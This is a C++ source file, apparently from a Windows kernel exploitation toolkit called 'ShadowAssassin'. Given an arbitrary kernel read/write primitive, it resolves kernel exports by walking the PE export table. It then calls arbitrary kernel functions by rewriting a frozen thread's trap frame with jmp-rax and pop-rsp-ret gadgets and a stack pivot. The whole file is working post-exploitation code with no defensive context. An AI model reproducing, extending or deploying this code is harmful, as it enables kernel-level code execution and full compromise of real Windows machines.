#include "shadowassassin.h"

// Helper: read a null-terminated ASCII string from kernel using the 8-byte read primitive.
static std::string ReadKernelString(const std::function<uint64_t(uint64_t)>& fn, uint64_t addr) {
    std::string s;
    for (int i = 0; i < 16; i++) {
        uint64_t v = fn(addr + i * 8);
        for (int b = 0; b < 8; b++) {
            char c = (char)(v >> (b * 8));
            if (!c) return s;
            s += c;
        }
    }
    return s;
}


// --- Setup ---

ShadowAssassin::ShadowAssassin()
    : kernelBase(0), gadgetJmpRax(0), gadgetPopRspRet(0), scratchAddress(0)
{}

void ShadowAssassin::SetReadPrimitive(std::function<uint64_t(uint64_t)> fn)        { readFn  = fn; }
void ShadowAssassin::SetWritePrimitive(std::function<void(uint64_t, uint64_t)> fn) { writeFn = fn; }
void ShadowAssassin::SetKernelBase(uint64_t base)        { kernelBase     = base;   }
void ShadowAssassin::SetGadgetJmpRax(uint64_t offset)    { gadgetJmpRax   = offset; }
void ShadowAssassin::SetGadgetPopRspRet(uint64_t offset) { gadgetPopRspRet = offset; }
void ShadowAssassin::SetScratchAddress(uint64_t addr)    { scratchAddress  = addr;  }

void ShadowAssassin::SetTrapFrameOffset(uint64_t offset) {
    frameManager.SetTrapFrameOffset(offset);
}

FrameManager& ShadowAssassin::GetFrameManager() { return frameManager; }
JOPManager&   ShadowAssassin::GetJOPManager()   { return jopManager;   }

bool ShadowAssassin::Initialize() {
    if (!readFn || !writeFn || !kernelBase) return false;

    // Sanity-check: read primitive should see the MZ magic at the kernel image base.
    if ((readFn(kernelBase) & 0xFFFF) != 0x5A4D) return false;

    frameManager.SetReadPrimitive(readFn);
    frameManager.SetWritePrimitive(writeFn);
    jopManager.SetKernelAddress(kernelBase);

    return true;
}


// --- Kernel export resolution ---

uint64_t ShadowAssassin::ResolveKernelExport(const std::string& name) {
    uint32_t e_lfanew     = (uint32_t)(readFn(kernelBase + 0x3C)              & 0xFFFFFFFF);
    uint32_t exportDirRva = (uint32_t)(readFn(kernelBase + e_lfanew + 0x88)   & 0xFFFFFFFF);
    uint64_t dir          = kernelBase + exportDirRva;

    uint32_t numNames = (uint32_t)(readFn(dir + 0x18) & 0xFFFFFFFF);
    uint64_t namesTbl = kernelBase + (uint32_t)(readFn(dir + 0x20) & 0xFFFFFFFF);
    uint64_t ordTbl   = kernelBase + (uint32_t)(readFn(dir + 0x24) & 0xFFFFFFFF);
    uint64_t funcTbl  = kernelBase + (uint32_t)(readFn(dir + 0x1C) & 0xFFFFFFFF);

    for (uint32_t i = 0; i < numNames; i++) {
        uint32_t nameRva = (uint32_t)(readFn(namesTbl + i * 4) & 0xFFFFFFFF);
        if (ReadKernelString(readFn, kernelBase + nameRva) != name) continue;

        uint16_t ordinal = (uint16_t)(readFn(ordTbl + i * 2) & 0xFFFF);
        uint32_t funcRva = (uint32_t)(readFn(funcTbl + ordinal * 4) & 0xFFFFFFFF);
        return kernelBase + funcRva;
    }
    return 0;
}


// --- Syscall dispatch ---

uint64_t ShadowAssassin::CallSyscall(const std::string& name, const std::vector<uint64_t>& params) {
    if (!gadgetJmpRax || !gadgetPopRspRet) return 0;

    uint64_t funcAddr = ResolveKernelExport(name);
    if (!funcAddr) return 0;

    frameManager.CreateFrozenThread();

    uint64_t frameBase = frameManager.GetFrameAddress();
    if (!frameBase) return 0;

    frameManager.WriteRegister("rax", funcAddr);
    frameManager.WriteRegister("rip", kernelBase + gadgetJmpRax);

    // Pivot RSP well below the trap frame to avoid corrupting it on resume.
    uint64_t newRsp     = frameBase - 0x1000;
    uint64_t returnSlot = newRsp - 0x8;
    uint64_t safeRsp    = (frameBase + 0x190) + 0x58;

    writeFn(returnSlot, kernelBase + gadgetPopRspRet);
    writeFn(newRsp, safeRsp);
    frameManager.WriteRegister("rsp", returnSlot);

    // Windows x64 ABI: rcx/rdx/r8/r9 for args 0-3, stack at rsp+0x28+ for the rest.
    static const std::string argRegs[] = { "rcx", "rdx", "r8", "r9" };
    for (size_t i = 0; i < params.size() && i < 4; i++)
        frameManager.WriteRegister(argRegs[i], params[i]);

    for (size_t i = 4; i < params.size(); i++)
        writeFn(newRsp + 0x20 + (i - 4) * 8, params[i]);

    frameManager.ContinueThread();
    return funcAddr;
}
